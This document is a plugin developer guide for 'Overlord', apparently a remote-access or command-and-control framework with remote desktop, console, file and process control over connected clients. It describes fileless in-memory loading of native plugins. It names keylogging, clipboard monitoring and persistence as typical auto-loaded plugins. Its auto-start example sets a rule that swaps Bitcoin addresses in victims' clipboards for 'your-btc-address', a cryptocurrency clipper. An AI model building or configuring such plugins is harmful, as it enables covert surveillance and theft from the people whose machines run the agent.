# Overlord Plugins

This document explains how to build Overlord plugins. **Plugin 2.0** uses WebAssembly modules for agent-side code and permissioned host bridges. The legacy native plugin system still works, but native plugins are now considered v1.

Plugin UI and server-side logic can be written in JavaScript or TypeScript. Agent-side Plugin 2.0 code is a single WASM module that can be built from C, Rust, Zig, TinyGo, AssemblyScript, or any other toolchain that can target WASI-style WebAssembly. Legacy v1 agent plugins can still be written as native shared libraries.

> TL;DR: A Plugin 2.0 bundle is a zip with `config.json`, `<id>.html`, `<id>.css`, and either `<id>.js` or TypeScript under `src/`. If it needs agent-side code, include one `.wasm` module. Upload it in the Plugins page or drop it in `Overlord-Server/plugins`. The server shows declared `needs` before a WASM plugin can be sent to a client.

## Plugin 2.0: WASM runtime

WASM plugins run inside the agent through a sandboxed runtime. They cannot access files directly; instead they declare broad file needs in `config.json`, and the agent exposes only those approved bridge operations.

```json
{
  "name": "My WASM Plugin",
  "version": "1.0.0",
  "apiVersion": 2,
  "runtime": "wasm",
  "wasm": "my-plugin.wasm",
  "needs": {
    "files": [
      { "bucket": "pluginData", "access": ["read", "write", "list", "mkdir"], "reason": "Store plugin state" },
      { "bucket": "downloads", "access": ["list"], "reason": "Let the user pick downloaded files" }
    ]
  }
}
```

Supported file buckets are `home`, `desktop`, `documents`, `downloads`, `temp`, `appData`, `pluginData`, and `fullDisk`. Supported operations are `read`, `write`, `list`, `delete`, and `mkdir`. Approval is tracked by a stable hash of the normalized needs; changing needs requires approval again.

Required exports:

| Export | Signature |
|--------|-----------|
| `overlord_alloc` | `ptr(uint32 size)` |
| `overlord_free` | `void(ptr, uint32 size)` |
| `overlord_on_load` | `int32(ptr hostInfo, uint32 hostInfoLen)` |
| `overlord_on_event` | `int32(ptr event, uint32 eventLen, ptr payload, uint32 payloadLen)` |
| `overlord_on_unload` | `void()` |

Host imports are available from both `env` and `overlord` modules:

| Import | Behavior |
|--------|----------|
| `overlord_emit(event, eventLen, payload, payloadLen)` | Sends an event back through the normal plugin event channel. |
| `overlord_host_info(out, outLen)` | Writes HostInfo JSON into `out`; includes `clientId`, `os`, `arch`, and `version`. |
| `overlord_fs_stat(bucket, bucketLen, path, pathLen, out, outLen)` | Writes JSON file metadata into `out`. |
| `overlord_fs_list(bucket, bucketLen, path, pathLen, out, outLen)` | Writes a JSON directory listing into `out`. |
| `overlord_fs_read(bucket, bucketLen, path, pathLen, out, outLen)` | Writes file bytes into `out`, max 32 MB. |
| `overlord_fs_write(bucket, bucketLen, path, pathLen, data, dataLen)` | Writes bytes to a bucket-relative path. |
| `overlord_fs_delete(bucket, bucketLen, path, pathLen)` | Deletes a bucket-relative file or directory. |
| `overlord_fs_mkdir(bucket, bucketLen, path, pathLen)` | Creates a bucket-relative directory. |

Bridge functions return non-negative byte counts or `0` on success. Negative return codes mean denied, invalid path/memory, not found, output buffer too small, file too large, or I/O failure.

See `plugins/sample-wasm` for a C/WASI example, `plugins/sample-wasm-hostinfo` for a TinyGo example, and `plugins/sample-wasm-platform-note` for a Rust example.

## TypeScript UI and server logic

Plugin bundles can ship TypeScript source for browser UI logic and the optional server runtime. The server compiles these files during extraction, so the uploaded zip can stay clean and source-oriented.

Default layout:

```
sample-ts-fullstack.zip
  ├─ config.json
  ├─ sample-ts-fullstack.html
  ├─ sample-ts-fullstack.css
  └─ src/
     ├─ ui.ts
     ├─ server.ts
     └─ shared.ts
```

`src/ui.ts` is compiled to `assets/<pluginId>.js`. `src/server.ts` is compiled to `server.js`. Both entrypoints can import other local files, so plugin authors can split code across multiple TypeScript modules instead of maintaining one large JavaScript file. This is only for browser UI and server-side plugin runtime logic; agent-side WASM is still supplied as a prebuilt `.wasm` file.

You can override entrypoints in `config.json`:

```json
{
  "apiVersion": 2,
  "uiEntry": "src/browser/main.ts",
  "serverEntry": "src/backend/index.ts"
}
```

Only files under `src/` are copied for compilation. Extraction does not run `npm install`, download packages, or execute arbitrary build scripts; use relative imports and APIs already available in the browser or the Overlord plugin server runtime.

See `plugins/sample-ts-fullstack` for a multi-file TypeScript UI/backend example.

## 1) How plugins are structured

### Required bundle format

A plugin bundle is a zip file named after the plugin ID:

```
<pluginId>.zip
```

For a Plugin 2.0 source-oriented bundle, the root normally contains:

```
<pluginId>.zip
  ├─ config.json
  ├─ <pluginId>.html
  ├─ <pluginId>.css
  ├─ <pluginId>.js              (optional when src/ui.ts exists)
  ├─ <pluginId>.wasm            (optional agent-side WASM module)
  └─ src/                       (optional TypeScript/JavaScript source)
     ├─ ui.ts                   (compiled to assets/<pluginId>.js)
     ├─ server.ts               (compiled to server.js)
     └─ shared.ts
```

For a legacy native v1 bundle, include platform-specific binaries named `<pluginId>-<os>-<arch>.<ext>` plus web assets.

Plugin 2.0 example for plugin ID `sample-wasm`:

```
sample-wasm.zip
  ├─ config.json
  ├─ sample-wasm.html
  ├─ sample-wasm.css
  ├─ sample-wasm.wasm
  └─ src/
     ├─ ui.ts
     └─ server.ts
```

When the server extracts the zip:

```
Overlord-Server/plugins/sample-wasm/
  ├─ sample-wasm.wasm
  ├─ server.js              (compiled from src/server.ts when present)
  ├─ manifest.json          (auto-generated, merged with config.json)
  ├─ src/                   (copied source files)
  ├─ data/
  │  └─ plugin.db           (auto-created when server.js is present)
  └─ assets/
     ├─ sample-wasm.html
     ├─ sample-wasm.css
     └─ sample-wasm.js      (compiled from src/ui.ts or copied from root JS)
```

### Runtime selection

`config.json` controls the runtime style:

```json
{
  "apiVersion": 2,
  "runtime": "wasm",
  "wasm": "sample-wasm.wasm"
}
```

Use `runtime: "wasm"` when the plugin has an agent-side WASM module. Use `runtime: "server"` for UI/server-only Plugin 2.0 bundles. Legacy native bundles omit `apiVersion`/`runtime` or use `runtime: "native"`.

### WASM architecture behavior

WASM plugins are universal: the same `.wasm` file is sent to Windows, Linux, and macOS clients on any supported architecture. To branch by client platform, read HostInfo either from `overlord_on_load(hostInfo, hostInfoLen)` or by calling `overlord_host_info(out, outLen)`.

Example HostInfo:

```json
{
  "clientId": "abc123",
  "os": "windows",
  "arch": "amd64",
  "version": "1.0.0"
}
```

### Legacy native architecture validation

Legacy native v1 binaries are still matched to clients by OS and architecture. Binary filenames **must** follow the naming convention `<pluginId>-<os>-<arch>.<ext>`:

| OS       | Arch    | Example filename             |
|----------|---------|------------------------------|
| windows  | amd64   | `sample-windows-amd64.dll`   |
| windows  | arm64   | `sample-windows-arm64.dll`   |
| linux    | amd64   | `sample-linux-amd64.so`      |
| linux    | arm64   | `sample-linux-arm64.so`      |
| darwin   | amd64   | `sample-darwin-amd64.dylib`  |
| darwin   | arm64   | `sample-darwin-arm64.dylib`  |

The server will **never** send an x64 native binary to an ARM client (or vice versa). If no native binary matches the client's platform, loading is skipped with an error.

### Manifest fields

The auto-generated manifest (merged with `config.json` if present):

```json
{
  "id": "sample",
  "name": "Sample Plugin",
  "apiVersion": 2,
  "runtime": "wasm",
  "version": "1.0.0",
  "description": "An example plugin",
  "wasm": "sample.wasm",
  "needs": {
    "files": [
      { "bucket": "pluginData", "access": ["read", "write"], "reason": "Store plugin state" }
    ]
  },
  "binaries": {
    "wasm32-wasi": "sample.wasm"
  },
  "entry": "sample.html",
  "assets": {
    "html": "sample.html",
    "css": "sample.css",
    "js": "sample.js"
  },
  "navbar": {
    "label": "Sample",
    "icon": "fa-cube"
  }
}
```

The `navbar`, `needs`, `wasm`, and TypeScript entrypoint fields are present only when declared or inferred from the bundle.

### Global Nav Bar Plugins (`config.json`)

Include an optional `config.json` in the root of your plugin zip to register the plugin in the global navigation bar. This is suited for plugins that operate across all clients (e.g. a global clipboard manager) rather than requiring a specific `?clientId=` to be selected first.

```json
{
  "name": "My Plugin",
  "version": "1.0.0",
  "description": "A global plugin",
  "navbar": {
    "label": "My Plugin",
    "icon": "fa-cube"
  }
}
```

**`navbar.icon`** accepts any [Font Awesome 6 solid icon class](https://fontawesome.com/icons?s=solid) without the `fa-solid` prefix, e.g. `fa-clipboard`, `fa-network-wired`, `fa-key`.

When the server extracts the bundle:
- `config.json` fields are merged into the auto-generated `manifest.json`
- If the plugin is also `enabled`, it will appear in the **"Plugin Apps"** group in the sidebar/topbar
- Clicking the nav entry opens the plugin at `/plugins/<id>` — **without** a `?clientId=` parameter, suitable for global operation

> **Important:** `config.json` must be in the **root** of the zip (not inside a subfolder). The build scripts automatically include it if it exists at the plugin source root. The manifest is re-generated on every extraction (triggered when the zip is newer than `manifest.json`), so keep `config.json` in the zip to avoid losing the navbar registration on re-upload.

## 2) Legacy native plugin ABI

This section applies only to legacy v1 native agent plugins. Plugin 2.0 WASM modules use the `overlord_*` ABI described above.

Every native plugin must export **C-callable functions** with specific signatures. The ABI differs slightly between Windows and Unix.

### Required exports

| Export             | Signature (Windows)                                                   | Signature (Linux / macOS)                                                         | Required |
|--------------------|-----------------------------------------------------------------------|-----------------------------------------------------------------------------------|----------|
| `PluginOnLoad`     | `int PluginOnLoad(char* hostInfo, int hostInfoLen, uint64 callback)`  | `int PluginOnLoad(char* hostInfo, int hostInfoLen, uintptr callback, uintptr ctx)` | Yes      |
| `PluginOnEvent`    | `int PluginOnEvent(char* event, int eventLen, char* payload, int payloadLen)` | same                                                                      | Yes      |
| `PluginOnUnload`   | `void PluginOnUnload()`                                               | same                                                                              | Yes      |
| `PluginSetCallback`| `void PluginSetCallback(uint64 callback)`                             | —                                                                                 | Windows only |
| `PluginGetRuntime` | `const char* PluginGetRuntime()`                                      | same                                                                              | Recommended  |

### Host callback

The host passes a callback function pointer during `PluginOnLoad`. The plugin uses it to send events back to the agent.

**Windows** — The callback is a `__stdcall` function:

```c
void __stdcall callback(const char *event, uintptr_t eventLen,
                        const char *payload, uintptr_t payloadLen);
```

**Linux / macOS** — The callback is a standard C function with an opaque context pointer:

```c
void callback(uintptr_t ctx,
              const char *event, int eventLen,
              const char *payload, int payloadLen);
```

The `ctx` value received in `PluginOnLoad` must be passed back as the first argument to every callback invocation.

### PluginGetRuntime (runtime detection)

If a plugin exports `PluginGetRuntime`, the host calls it after loading. It must return a pointer to a static, null-terminated string identifying the runtime:

| Return value | Meaning                               |
|-------------|---------------------------------------|
| `"c"`       | Pure C plugin — fully unloadable      |
| `"cpp"`     | C++ plugin — fully unloadable         |
| `"rust"`    | Rust plugin — fully unloadable        |
| *(absent)*  | Defaults to `"go"` — **not** freed    |

This matters because **Go plugins cannot be fully unloaded** due to [golang/go#11100](https://github.com/golang/go/issues/11100) — Go's runtime spawns threads that cannot be stopped, so calling `FreeLibrary`/`dlclose` on a Go shared library causes a crash. The host uses this information to skip freeing Go plugins while properly reclaiming memory for C/C++/Rust plugins.

The runtime is logged on load and unload:
```
[plugins] loaded plugin "sample-c" (runtime=c, freeable=true)
[plugins] unloaded plugin "sample-c" — memory freed
[plugins] unloaded plugin "sample-go" — memory leaked (go runtime)
```

### HostInfo JSON

The `hostInfo` buffer passed to `PluginOnLoad` is JSON:

```json
{
  "clientId": "abc123",
  "os": "windows",
  "arch": "amd64",
  "version": "1.0.0"
}
```

### Loading mechanism

- **Windows** — DLLs are loaded **entirely in memory** via a custom PE loader. No files are written to disk. This is why Rust's `std::sync::Mutex` (backed by `SRWLOCK`) may not initialize correctly — see the Rust section below.
- **Linux** — Shared libraries are loaded in memory via `memfd_create` + `dlopen` on `/proc/self/fd/`. No files touch disk.
- **macOS** — Shared libraries are written to a temp file, `dlopen`'d, then the temp file is deleted.

## 3) Sample plugins

Current Plugin 2.0 samples:

| Sample | Purpose |
|--------|---------|
| `sample-wasm` | C/WASI file bridge sample using `pluginData`, `downloads`, and `overlord_host_info`. |
| `sample-wasm-hostinfo` | TinyGo sample that queries HostInfo from a universal WASM module. |
| `sample-wasm-platform-note` | Rust sample that branches by `os`/`arch` inside one WASM module and writes a platform-specific note. |
| `sample-ts-fullstack` | TypeScript UI plus TypeScript server runtime with shared local modules. |

Legacy native samples remain available:

### Go (`sample-go/`)

Go plugins use `-buildmode=c-shared` with platform-specific export wrappers.

**Project structure:**
```
sample-go/native/
  ├─ main.go              (shared core logic)
  ├─ exports_unix.go      (exports for Linux/macOS)
  ├─ exports_windows.go   (exports for Windows)
  └─ go.mod
```

**Linux / macOS exports:**
```go
//export PluginOnLoad
func PluginOnLoad(hostInfo *C.char, hostInfoLen C.int, cb C.uintptr_t, ctx C.uintptr_t) C.int

//export PluginOnEvent
func PluginOnEvent(event *C.char, eventLen C.int, payload *C.char, payloadLen C.int) C.int

//export PluginOnUnload
func PluginOnUnload()
```

**Windows exports:**
```go
//export PluginOnLoad
func PluginOnLoad(hostInfo *C.char, hostInfoLen C.int, callbackPtr C.ulonglong) C.int

//export PluginOnEvent
func PluginOnEvent(event *C.char, eventLen C.int, payload *C.char, payloadLen C.int) C.int

//export PluginOnUnload
func PluginOnUnload()

//export PluginSetCallback
func PluginSetCallback(callbackPtr C.ulonglong)
```

**Build:**
```bash
CGO_ENABLED=1 go build -buildmode=c-shared -o sample-windows-amd64.dll ./native
```

> **Note:** Go plugins do **not** export `PluginGetRuntime` and default to the `"go"` runtime. They are intentionally never freed on unload to prevent crashes from orphaned Go runtime threads.

---

### C (`sample-c/`)

Pure C plugins are the simplest — no runtime, no GC, fully unloadable.

**Project structure:**
```
sample-c/
  ├─ native/plugin.c
  ├─ sample-c.html
  ├─ sample-c.css
  └─ sample-c.js
```

**Key points:**
- Uses `__declspec(dllexport)` on Windows, `__attribute__((visibility("default")))` on Unix
- Has a `DllMain` entry point on Windows (receives `DLL_PROCESS_ATTACH` / `DLL_PROCESS_DETACH`)
- Exports `PluginGetRuntime` → returns `"c"`
- No heap allocations required — can use stack buffers for all responses

**Minimal example (Windows callback):**
```c
#ifdef _WIN32
typedef void (__stdcall *host_callback_t)(
    const char *event, uintptr_t eventLen,
    const char *payload, uintptr_t payloadLen);
#else
typedef void (*host_callback_t)(
    uintptr_t ctx,
    const char *event, int eventLen,
    const char *payload, int payloadLen);
#endif

static host_callback_t g_callback;

EXPORT int PluginOnLoad(const char *hostInfo, int hostInfoLen, ...) {
    // Parse hostInfo JSON, store callback, return 0 on success
}

EXPORT int PluginOnEvent(const char *event, int eventLen,
                         const char *payload, int payloadLen) {
    // Handle events, call g_callback() to respond
    return 0;
}

EXPORT void PluginOnUnload(void) {
    // Cleanup
}

EXPORT const char *PluginGetRuntime(void) { return "c"; }
```

**Build:**
```bash
# MSVC
cl /LD /O2 plugin.c /Fe:sample-c-windows-amd64.dll

# MinGW / gcc
gcc -shared -O2 -o sample-c-windows-amd64.dll plugin.c

# Linux
gcc -shared -fPIC -O2 -o sample-c-linux-amd64.so plugin.c
```

---

### C++ (`sample-cpp/`)

C++ plugins can use the full standard library (STL containers, `std::mutex`, `std::string`, etc.) while still being fully unloadable.

**Project structure:**
```
sample-cpp/
  ├─ native/plugin.cpp
  ├─ sample-cpp.html
  ├─ sample-cpp.css
  └─ sample-cpp.js
```

**Key points:**
- All exports wrapped in `extern "C"` to prevent name mangling
- Can freely use `std::string`, `std::unordered_map`, `std::mutex`, etc.
- Exports `PluginGetRuntime` → returns `"cpp"`

**Build:**
```bash
# MSVC
cl /LD /EHsc /O2 plugin.cpp /Fe:sample-cpp-windows-amd64.dll

# MinGW / g++
g++ -shared -O2 -o sample-cpp-windows-amd64.dll plugin.cpp

# Linux
g++ -shared -fPIC -O2 -o sample-cpp-linux-amd64.so plugin.cpp
```

---

### Rust (`sample-rust/`)

Rust plugins compile as `cdylib` crates. Exports use `#[no_mangle]` and `extern "C"`.

**Project structure:**
```
sample-rust/
  ├─ native/
  │   ├─ Cargo.toml
  │   └─ src/lib.rs
  ├─ sample-rust.html
  ├─ sample-rust.css
  └─ sample-rust.js
```

**Key points:**
- `crate-type = ["cdylib"]` in Cargo.toml
- Uses `extern "stdcall"` for the callback type on Windows, `extern "C"` on Unix
- Exports `PluginGetRuntime` → returns `"rust"`

**⚠️ Important: avoid `std::sync::Mutex` on Windows.** Because the DLL is loaded via an in-memory PE loader (not `LoadLibrary`), Rust's standard `Mutex` (backed by Windows `SRWLOCK`) may not initialize correctly, causing an access violation. Use C-style `static mut` globals instead — this is safe because the Go host serializes all calls through its own mutex.

**Cargo.toml:**
```toml
[lib]
crate-type = ["cdylib"]

[profile.release]
opt-level = "z"
lto = true
strip = true
```

**Build:**
```bash
# Native
cargo build --release

# Cross-compile
cargo build --release --target=x86_64-pc-windows-msvc
cargo build --release --target=aarch64-unknown-linux-gnu
```

## 4) Legacy native build scripts & cross-compilation

This section applies to legacy native v1 plugins. Plugin 2.0 WASM modules are universal and do not need one binary per OS/architecture, though you still need a WASM toolchain such as WASI clang, Rust `wasm32-wasip1`, Zig, TinyGo, or AssemblyScript.

Each legacy native sample keeps its `.bat` (Windows) and `.sh` (Unix) build scripts in the plugin's own directory. All scripts support the `BUILD_TARGETS` environment variable to compile for multiple platforms in one invocation.

### Available build scripts

| Language | Windows                  | Unix                    |
|----------|--------------------------|-------------------------|
| Go       | `sample-go/build.bat`       | `sample-go/build.sh`       |
| C        | `sample-c/build.bat`        | `sample-c/build.sh`        |
| C++      | `sample-cpp/build.bat`      | `sample-cpp/build.sh`      |
| Rust     | `sample-rust/build.bat`     | `sample-rust/build.sh`     |

### Usage

All scripts default to building for the host platform only:

```bash
# Build for current platform
cd sample-c
./build.sh

# Build for multiple targets
BUILD_TARGETS="linux-amd64 linux-arm64 windows-amd64" ./build.sh

# Custom plugin directory
./build.sh /path/to/my-plugin
```

```bat
REM Build for current platform
sample-c\build.bat

REM Build for multiple targets
set BUILD_TARGETS=windows-amd64 windows-arm64
sample-c\build.bat

REM Custom plugin directory
sample-c\build.bat C:\path\to\my-plugin
```

### Cross-compilation

**Go** — Cross-compilation is built-in via `GOOS` / `GOARCH` env vars. No extra toolchains needed (unless CGo calls platform-specific APIs).

**Rust** — Cross-compilation uses `--target=` with Rust target triples. Install targets with `rustup target add <triple>`. The build scripts map `os-arch` pairs to triples automatically:

| Target          | Rust triple (`.bat` / MSVC)         | Rust triple (`.sh` / GNU)             |
|-----------------|-------------------------------------|---------------------------------------|
| windows-amd64   | `x86_64-pc-windows-msvc`           | `x86_64-pc-windows-gnu`              |
| windows-arm64   | `aarch64-pc-windows-msvc`          | `aarch64-pc-windows-gnullvm`         |
| linux-amd64     | `x86_64-unknown-linux-gnu`         | `x86_64-unknown-linux-gnu`           |
| linux-arm64     | `aarch64-unknown-linux-gnu`        | `aarch64-unknown-linux-gnu`          |
| darwin-amd64    | `x86_64-apple-darwin`              | `x86_64-apple-darwin`                |
| darwin-arm64    | `aarch64-apple-darwin`             | `aarch64-apple-darwin`               |

**C / C++** — Cross-compilation requires the appropriate cross-compiler toolchain to be installed:

| Target          | C compiler                    | C++ compiler                   |
|-----------------|-------------------------------|--------------------------------|
| linux-amd64     | `x86_64-linux-gnu-gcc`        | `x86_64-linux-gnu-g++`         |
| linux-arm64     | `aarch64-linux-gnu-gcc`       | `aarch64-linux-gnu-g++`        |
| linux-arm       | `arm-linux-gnueabihf-gcc`     | `arm-linux-gnueabihf-g++`      |
| windows-amd64   | `x86_64-w64-mingw32-gcc`      | `x86_64-w64-mingw32-g++`       |
| windows-arm64   | `aarch64-w64-mingw32-gcc`     | `aarch64-w64-mingw32-g++`      |

On Windows `.bat` scripts, MSVC (`cl`) is tried first with the appropriate `/link /machine:` flag, falling back to MinGW if `cl` fails.

On Unix `.sh` scripts, override the compiler with `CC=<compiler>` (C) or `CXX=<compiler>` (C++):

```bash
CC=zig-cc BUILD_TARGETS="linux-arm64" ./sample-c/build.sh
CXX=zig-c++ BUILD_TARGETS="linux-arm64" ./sample-cpp/build.sh
```

### Installing cross-compiler toolchains

**Debian/Ubuntu:**
```bash
# ARM64 Linux cross-compilers
sudo apt install gcc-aarch64-linux-gnu g++-aarch64-linux-gnu

# Windows cross-compilers (MinGW)
sudo apt install gcc-mingw-w64-x86-64 g++-mingw-w64-x86-64

# Rust targets
rustup target add aarch64-unknown-linux-gnu x86_64-pc-windows-gnu
```

**macOS (Homebrew):**
```bash
# Linux cross-compilers via musl-cross
brew install FiloSottile/musl-cross/musl-cross

# Rust targets
rustup target add aarch64-apple-darwin x86_64-apple-darwin
```

### WASM build examples

Plugin 2.0 samples keep their Windows builders in their own plugin directories:

| Script | Purpose |
|--------|---------|
| `sample-wasm/build.bat` | Builds and packages `sample-wasm`. |
| `sample-wasm-hostinfo/build.bat` | Builds and packages `sample-wasm-hostinfo`. |
| `sample-wasm-platform-note/build.bat` | Builds and packages `sample-wasm-platform-note`. |
| `sample-ts-fullstack/build.bat` | Packages the TypeScript UI/server sample; the server compiles TypeScript during extraction. |

Usage:

```bat
REM Per-sample Plugin 2.0 build
sample-ts-fullstack\build.bat
sample-wasm\build.bat
```

The sample WASM plugins intentionally use different source languages:

| Sample | Source language | Toolchain |
|--------|-----------------|-----------|
| `sample-wasm` | C | WASI-capable `clang` |
| `sample-wasm-hostinfo` | Go | TinyGo 0.41.0+ with `-target=wasi` |
| `sample-wasm-platform-note` | Rust | Rust target `wasm32-wasip1` |

A minimal manual C/WASI build for `sample-wasm` looks like:

```bash
clang --target=wasm32-wasi -O2 \
  -Wl,--no-entry \
  -Wl,--export=overlord_alloc \
  -Wl,--export=overlord_free \
  -Wl,--export=overlord_on_load \
  -Wl,--export=overlord_on_event \
  -Wl,--export=overlord_on_unload \
  -o sample-wasm.wasm native/sample_wasm.c
```

The generated `.wasm` goes at the root of the plugin zip and is referenced by `config.json`.

For the TinyGo sample, install TinyGo 0.41.0 or newer and run `sample-wasm-hostinfo\build.bat`. For the Rust sample, install the target with `rustup target add wasm32-wasip1`, then run `sample-wasm-platform-note\build.bat`.

## 5) Install & open a plugin

### Install / upload

- Use the UI at `/plugins` to upload the zip
- Or drop `<pluginId>.zip` into `Overlord-Server/plugins` and restart

### Open the UI

Plugin UI is embedded directly in the main page at:

```
/plugins/<pluginId>?clientId=<CLIENT_ID>
```

For **global nav bar plugins** (those registered via `config.json`), the UI opens without a client ID:

```
/plugins/<pluginId>
```

The server reads your `<pluginId>.html`, extracts the body content, and renders it inside the standard Overlord layout. Your CSS and generated/copied JS are loaded from `/plugins/<pluginId>/assets/`.

To get the `clientId` in your JS (for per-client plugins):

```js
const clientId = new URLSearchParams(window.location.search).get("clientId");
```

For global plugins, `clientId` will be `null`. Use `/api/clients?status=online&pageSize=1000` to enumerate connected clients and broadcast events to all of them:

```js
const res = await fetch("/api/clients?status=online&pageSize=1000");
const { items } = await res.json();
const onlineIds = items.filter(c => c.online).map(c => c.id);
```

## 6) Runtime: how events flow

Overlord plugins have **two parts**:

1. **UI (HTML/CSS/JS)** — Runs in the browser, calls server APIs.
2. **Optional agent module** — Plugin 2.0 uses WASM; legacy v1 uses native shared libraries.

Plugins can also include optional **server-side logic** through `server.js` or compiled `src/server.ts`. That code runs in the server plugin worker and exposes RPC/broadcast APIs to the UI.

### UI → agent (plugin event)

From your UI JS:

```
POST /api/clients/<clientId>/plugins/<pluginId>/event
{
  "event": "ui_message",
  "payload": { "message": "hello" }
}
```

If the plugin is not loaded yet, the server will load it on the client, queue the event, and deliver it once ready.

### Agent → plugin

For WASM plugins, the agent calls `overlord_on_event(eventPtr, eventLen, payloadPtr, payloadLen)`. For legacy native plugins, the agent calls `PluginOnEvent(event, payload)`. In both cases the payload is JSON-encoded data from the UI/server.

### Plugin → agent/server events

WASM plugins send events with `overlord_emit(event, eventLen, payload, payloadLen)`. Legacy native plugins use the callback received during `PluginOnLoad`.

**Go:**
```go
send("echo", []byte(`{"message":"hello back"}`))
```

**C / C++:**
```c
g_callback("echo", 4, "{\"message\":\"hello back\"}", 24);
```

**Rust:**
```rust
let event = b"echo";
let payload = b"{\"message\":\"hello back\"}";
(g_callback)(event.as_ptr(), event.len(), payload.as_ptr(), payload.len());
```

On Windows, the callback uses `__stdcall` calling convention. On Unix, it's a standard C call with the context pointer as the first argument.

### Plugin lifecycle events

The agent sends these events to the server:

- `loaded` on successful load
- `unloaded` when unloaded
- `error` if load or runtime fails

## 7) What can plugins do?

WASM Plugin 2.0 agent modules are sandboxed. They can:

- Receive UI/server events.
- Send events back through `overlord_emit`.
- Read HostInfo (`clientId`, `os`, `arch`, `version`).
- Use declared file bridges after the user approves the plugin's `needs`.

WASM modules cannot directly access arbitrary files, processes, network sockets, or OS APIs unless Overlord exposes an explicit host bridge.

Legacy native v1 plugins run as native code and can:

- Call any system API (file I/O, network, processes, etc.)
- Use any library available to their language
- Spawn threads / goroutines
- Access hardware
- Do anything a normal native program can do

Legacy native plugins have the same capabilities as the agent itself.

| Language | Can be fully unloaded? | Runtime overhead |
|----------|----------------------|------------------|
| C        | Yes                  | None             |
| C++      | Yes                  | Minimal (STL)    |
| Rust     | Yes                  | Minimal          |
| Go       | **No** ([#11100](https://github.com/golang/go/issues/11100)) | Go runtime + GC  |

### UI embedding

Plugin UI pages are embedded **directly** into the main Overlord page — no iframe, no sandbox, no bridge. The server reads your plugin's HTML, extracts the `<body>` content and any `<link>`/`<style>` tags from the `<head>`, and injects them into the standard page layout (with nav bar, Tailwind CSS, etc.).

Your plugin JS runs in the same browsing context as the main UI, so `fetch()` calls to the API work directly — no special bridge or proxy needed.

Plugin assets (CSS, JS, images) are served from `/plugins/<pluginId>/assets/`.

### CSP-safe JavaScript

The Overlord UI enforces a **Content Security Policy** that blocks `unsafe-inline` script execution. This means:

- **No** `onclick="..."`, `onchange="..."`, or other inline event handler attributes in HTML strings
- **No** `javascript:` URLs
- **No** `eval()` or `new Function()`

When dynamically generating HTML (e.g. in a `renderRules()` function), use `data-*` attributes and event delegation instead:

```js
// ❌ Blocked by CSP
element.innerHTML = `<button onclick="removeItem(${i})">Remove</button>`;

// ✅ CSP-safe
element.innerHTML = `<button class="remove-btn" data-index="${i}">Remove</button>`;
element.addEventListener("click", (e) => {
  if (!e.target.classList.contains("remove-btn")) return;
  const index = parseInt(e.target.getAttribute("data-index"), 10);
  removeItem(index);
});
```

### Script injection

The server auto-injects `<script src="/plugins/<pluginId>/assets/<pluginId>.js"></script>` at the end of the page — you don't need to include it yourself. If your plugin HTML does include `<script src=".../<pluginId>.js">` in its `<body>` (e.g. so the file works standalone in a browser), the server strips that tag during injection to prevent the script from running twice. Other `<script>` tags in the body are left alone.

If you want defensive scoping anyway, wrap your plugin JS in an IIFE so top-level identifiers don't collide with the global scope:

```js
(() => {
  const MY_CONST = "value";
  // ... rest of plugin code
})();
```

## 8) API surface

### Plugin management

- `GET /api/plugins` — list installed plugins, including `runtime`, `apiVersion`, `needs`, `needsHash`, `needsApproved`, `autoLoad`, and `autoStartEvents`
- `POST /api/plugins/upload` — upload zip
- `POST /api/plugins/<id>/enable` — enable/disable
- `POST /api/plugins/<id>/needs/approve` — approve the currently declared Plugin 2.0 needs hash
- `POST /api/plugins/<id>/autoload` — configure auto-load on client connect
- `DELETE /api/plugins/<id>` — remove (preserves `data/` directory)

### Plugin data directory

- `GET /api/plugins/<id>/data` — list files in the plugin's persistent data directory
- `GET /api/plugins/<id>/data/<path>` — read a file
- `PUT /api/plugins/<id>/data/<path>` — write a file
- `DELETE /api/plugins/<id>/data/<path>` — delete a file or directory
- `POST /api/plugins/<id>/exec` — execute a stored binary (admin/operator only)

See [section 10](#10-server-side-plugin-data-directory) for full details.

### Server-side plugin runtime

- `POST /api/plugins/<id>/rpc` — invoke a method on the plugin's worker
- `GET /api/plugins/<id>/stream` — Server-Sent Events stream of `ctx.broadcast()` calls

See [section 11](#11-server-side-plugin-runtime) for full details.

### Per-client plugin runtime

- `POST /api/clients/<clientId>/plugins/<pluginId>/load`
- `POST /api/clients/<clientId>/plugins/<pluginId>/event`
- `POST /api/clients/<clientId>/plugins/<pluginId>/unload`

### Useful built-in endpoints

- `POST /api/clients/<clientId>/command`
- `WS /api/clients/<clientId>/rd/ws` (remote desktop)
- `WS /api/clients/<clientId>/console/ws`
- `WS /api/clients/<clientId>/files/ws`
- `WS /api/clients/<clientId>/processes/ws`

## 9) Auto-load plugins on client connect

By default, plugins are only loaded when manually triggered via the API or UI. For plugins that need to run 24/7 on every connected client (e.g. clipboard monitoring, keylogging, persistence), you can configure **auto-load**.

When auto-load is enabled for a plugin, the server will automatically load it onto every client that connects. If the client already has the plugin loaded, it's skipped — no duplicate loads.

You can also configure **auto-start events** — a list of events that are queued and delivered to the plugin immediately after it loads. This lets you pre-configure the plugin without any manual interaction.

### Autostart switch in global plugin UI

Global nav bar plugins (those with a `navbar` entry in `config.json`) can expose an **"Autostart on new clients"** toggle directly in their UI. This checkbox controls whether new clients that connect will automatically have the plugin loaded and the current configuration replayed.

When the switch is checked, the UI calls `POST /api/plugins/<id>/autoload` with `autoLoad: true` and the current `autoStartEvents` (rule set + start order). When unchecked, it sets `autoLoad: false` — new clients won't receive the plugin unless manually triggered.

The switch state is saved to the server and restored when the plugin page is reopened.

### Enable auto-load

```
POST /api/plugins/<pluginId>/autoload
Content-Type: application/json

{
  "autoLoad": true
}
```

### Enable auto-load with auto-start events

```
POST /api/plugins/<pluginId>/autoload
Content-Type: application/json

{
  "autoLoad": true,
  "autoStartEvents": [
    { "event": "add_rule", "payload": { "pattern": "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", "replacement": "your-btc-address" } },
    { "event": "start", "payload": {} }
  ]
}
```

The events in `autoStartEvents` are queued in order and delivered to the plugin after it reports `loaded`. This works exactly like calling the event API multiple times, but happens automatically.

### Disable auto-load

```
POST /api/plugins/<pluginId>/autoload
Content-Type: application/json

{
  "autoLoad": false
}
```

### How it works

1. Client connects and completes the enrollment handshake
2. Server sends `hello_ack` (as usual)
3. Server dispatches auto-scripts (as usual)
4. Server checks all plugins with `autoLoad: true` and `enabled: true`
5. For each, if the plugin is **not already loaded** on that client:
   - Sends the plugin binary bundle (chunked)
   - Queues any `autoStartEvents`
